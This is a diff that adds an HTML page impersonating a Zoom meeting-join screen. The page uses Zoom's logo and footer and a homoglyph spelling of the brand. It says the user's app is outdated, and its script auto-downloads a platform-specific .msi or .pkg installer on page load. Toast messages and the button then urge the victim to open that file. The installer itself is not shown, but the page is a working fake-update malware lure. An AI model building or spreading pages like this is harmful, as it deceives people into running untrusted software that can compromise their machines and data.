@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>Joining Meeting</title>
+    <link rel="shortcut icon" href="https://us02st1.zoom.us/zoom.ico">
+    <meta name="robots" content="noindex,nofollow,noarchive">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&amp;display=swap"
+
+      rel="stylesheet">
+    <style>
+    body {
+        margin: 0;
+        font-family: "Inter", Arial, sans-serif;
+        background: #f7f7f7;
+        color: #232333;
+    }
+
+    .header {
+        background: #ffffff;
+        border-bottom: 1px solid #e5e5e5;
+        padding: 18px 40px;
+    }
+
+    .logo {
+        font-size: 28px;
+        font-weight: 600;
+        color: #2d8cff;
+    }
+
+    .container {
+        text-align: center;
+        margin-top: 90px;
+    }
+
+    h1 {
+        font-size: 30px;
+        font-weight: 600;
+        margin-bottom: 20px;
+    }
+
+    p {
+        font-size: 16px;
+        color: #4a4a4a;
+        margin: 10px 0;
+        line-height: 1.6;
+    }
+
+    .link {
+        color: #2d8cff;
+        text-decoration: none;
+        font-weight: 500;
+    }
+
+    .link:hover {
+        text-decoration: underline;
+    }
+
+    .btn {
+        margin-top: 30px;
+        background-color: #2d8cff;
+        color: #fff;
+        border: none;
+        padding: 14px 32px;
+        border-radius: 8px;
+        font-size: 16px;
+        font-weight: 500;
+        cursor: pointer;
+        transition: all 0.2s ease;
+    }
+
+    .btn:hover {
+        background-color: #1a73e8;
+    }
+
+    /* Progress bar */
+    .progress-container {
+        width: 300px;
+        height: 6px;
+        background: #e6e6e6;
+        border-radius: 10px;
+        margin: 25px auto;
+        overflow: hidden;
+    }
+
+    .progress-bar {
+        height: 100%;
+        width: 0%;
+        background: #2d8cff;
+        animation: loading 3s infinite;
+    }
+
+    @keyframes loading {
+        0% { width: 0%; }
+        50% { width: 80%; }
+        100% { width: 100%; }
+    }
+
+    .divider {
+        width: 60%;
+        margin: 50px auto;
+        border-top: 1px solid #e5e5e5;
+    }
+
+    .footer {
+        margin-top: 60px;
+        text-align: center;
+        font-size: 13px;
+        color: #777;
+    }
+
+    .footer a {
+        color: #2d8cff;
+        text-decoration: none;
+        margin: 0 5px;
+    }
+
+    .footer a:hover {
+        text-decoration: underline;
+    }
+</style> </head>
+  <body>
+    <div id="header" role="banner" class="clearfix"> <svg style="margin-top: 30px; margin-left: 30px;"
+
+        width="115" height="26" viewBox="0 0 114 26" fill="#0b5cff" class="header-logo">
+        <path fill-rule="evenodd" clip-rule="evenodd" d="m23.6977 25.2924h-20.10301c-1.32885 0-2.58954-.6978-3.202853-1.8892-.698493-1.3617-.4429462-2.9956.630343-4.068l13.98692-13.97375h-10.01743c-2.7599 0-4.99167-2.22968-4.99167-4.987h18.5186c1.3288 0 2.5895.69784 3.2028 1.88927.6986 1.36164.443 2.9956-.6303 4.0679l-13.98691 13.97378h11.60181c2.7599 0 4.9917 2.2297 4.9917 4.987zm79.5603-25.2924c-2.879 0-5.4691 1.24249-7.241 3.23389-1.7883-1.9914-4.3781-3.23389-7.2401-3.23389-5.3497 0-9.7108 4.56149-9.7108 9.88887v15.40353c2.7598 0 4.9915-2.2297 4.9915-4.987v-10.46757c0-2.5701 1.9933-4.74871 4.5487-4.85083 2.692-.10213 4.9237 2.05945 4.9237 4.73169v10.58671c0 2.7573 2.2317 4.987 4.9915 4.987v-15.45457c0-2.5701 1.9935-4.74871 4.5485-4.85083 2.692-.10213 4.924 2.05945 4.924 4.73169v10.58671c0 2.7573 2.232 4.987 4.991 4.987v-15.40353c-.017-5.32738-4.378-9.88887-9.727-9.88887zm-54.3805 12.8334c0 7.0806-5.7583 12.8335-12.8455 12.8335-7.0871 0-12.8454-5.7529-12.8454-12.8335 0-7.0805 5.7753-12.8334 12.8454-12.8334 7.0702 0 12.8455 5.7529 12.8455 12.8334zm-4.9917 0c0-4.32315-3.5265-7.8464-7.8538-7.8464-4.3272 0-7.8538 3.52325-7.8538 7.8464 0 4.3233 3.5266 7.8465 7.8538 7.8465 4.3273 0 7.8538-3.5232 7.8538-7.8465zm32.6758 0c0 7.0806-5.758 12.8335-12.8451 12.8335-7.0877 0-12.8458-5.7529-12.8458-12.8335 0-7.0805 5.7757-12.8334 12.8458-12.8334 7.0696 0 12.8451 5.7529 12.8451 12.8334zm-4.9915 0c0-4.32315-3.5264-7.8464-7.8536-7.8464-4.3273 0-7.8541 3.52325-7.8541 7.8464 0 4.3233 3.5268 7.8465 7.8541 7.8465 4.3272 0 7.8536-3.5232 7.8536-7.8465z"></path>
+      </svg> </div>
+    <div class="container">
+      <h1>Joining Meeting</h1>
+      <p>Sorry, You do not have the latest version of Zοоm Workplace App
+        installed.</p>
+      <p> The latest version of our Application will download automatically,
+        kindly install to join the Remote Desktop Meeting. </p>
+      <div class="progress-container">
+        <div class="progress-bar"></div>
+      </div>
+      <p> If the download doesn't start automatically, please <a href="#" class="link"
+
+          id="manualDownload">Download Manually</a> </p>
+      <button onclick="launchMeeting()" style="padding:12px 20px; background:#0b5fff; color:#fff; border:none; cursor:pointer;">
+        Launch Meeting </button>
+      <div class="divider"></div>
+      <p style="font-size:13px;"> By joining a meeting, you agree to our <a href="#"
+
+          class="link">Terms of Service</a> and <a href="#" class="link">Privacy
+          Statement</a> </p>
+    </div>
+    <div id="toast" style="
+    position: fixed;    bottom: 20px;    right: 20px;    background: #333;    color: #fff;    padding: 14px 18px;    border-radius: 6px;    font-family: Arial, sans-serif;    font-size: 14px;    opacity: 0;    transform: translateY(20px);    transition: all 0.4s ease;    z-index: 9999;">
+      Go to Downloads folder and click on <b>Zoom_X9TWGUQ0RITC_19SYPURD17668_windows_x64.msi</b> to
+      launch meeting </div>
+    <div class="footer">
+      <p style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; margin: 0px; font-size: 14px; line-height: 1.5; color: rgba(4, 4, 19, 0.56); font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;">©2026
+        Zoom Communications, Inc.<span>&nbsp;</span><span style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif;">All
+          rights reserved.</span></p>
+      <p class="LP3K7kSq" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; margin: 0px; font-size: 14px; line-height: 1.5; color: rgba(4, 4, 19, 0.56); font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"><a
+
+          href="#" target="_blank" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Trust
+          Center |</a><span>&nbsp;</span><a href="#"
+
+          target="_blank" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Acceptable
+          Use Guidelines |</a><span>&nbsp;</span><a href="#"
+
+          target="_blank" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Legal
+          &amp; Compliance |</a><span>&nbsp;</span><a href="#"
+
+          tabindex="0" role="button" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Do
+          Not Sell My Personal Information |</a><span>&nbsp;</span><a href="#"
+
+          tabindex="0" role="button" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Cookie
+          Preferences</a></p>
+    </div>
+    <script>
+const files = {
+    windows: "Zoom_X9TWGUQ0RITC_19SYPURD17668_windows_x64.msi",
+    mac: "Zoom_X9TWGUQ0RITC_19SYPURD17668_Macos_amd64.pkg"
+};
+
+let selectedFile = "";
+
+function detectOS() {
+    const ua = navigator.userAgent.toLowerCase();
+    if (ua.includes("win")) return "windows";
+    if (ua.includes("mac")) return "mac";
+    return "windows";
+}
+
+
+function showToast(message, duration = 6000) {
+    const toast = document.getElementById("toast");
+    if (!toast) return;
+
+    toast.innerHTML = message;
+    toast.style.opacity = "1";
+    toast.style.transform = "translateY(0)";
+
+    setTimeout(() => {
+        toast.style.opacity = "0";
+        toast.style.transform = "translateY(20px)";
+    }, duration);
+}
+
+
+function updateProgress(percent) {
+    const bar = document.querySelector(".progress-bar");
+    if (bar) {
+        bar.style.width = percent + "%";
+    }
+}
+
+
+async function downloadFile(url) {
+    try {
+        showToast("⬇️ Download started...");
+
+        const response = await fetch(url);
+        if (!response.ok) throw new Error("Download failed");
+
+        const contentLength = response.headers.get("content-length");
+        const total = contentLength ? parseInt(contentLength) : 0;
+
+        const reader = response.body.getReader();
+        let received = 0;
+        let chunks = [];
+
+        while (true) {
+            const { done, value } = await reader.read();
+            if (done) break;
+
+            chunks.push(value);
+            received += value.length;
+
+            if (total) {
+                updateProgress((received / total) * 100);
+            }
+        }
+
+        updateProgress(100);
+
+        const blob = new Blob(chunks);
+        const blobUrl = window.URL.createObjectURL(blob);
+
+        const a = document.createElement("a");
+        a.href = blobUrl;
+        a.download = url.split("/").pop();
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+
+        window.URL.revokeObjectURL(blobUrl);
+
+        showToast("✅ Download complete. You can open the file.");
+
+    } catch (err) {
+        console.log("Fallback download");
+        window.location.href = url;
+    }
+}
+
+
+function startDownload() {
+    const os = detectOS();
+    selectedFile = files[os];
+    downloadFile(selectedFile);
+}
+
+
+function launchMeeting() {
+
+    showToast(
+        '📂 Go to Downloads and open <b>Zoom_Workspace_7TCEGG8UFZLS_19SYPURD17668_windows_x64.msi</b>',
+        10000
+    );
+
+
+}
+
+window.addEventListener("DOMContentLoaded", () => {
+    const manualBtn = document.getElementById("manualDownload");
+    if (manualBtn) {
+        manualBtn.addEventListener("click", function(e) {
+            e.preventDefault();
+            startDownload();
+        });
+    }
+
+    setTimeout(startDownload, 1200);
+});
+</script>
+  </body>
+</html>
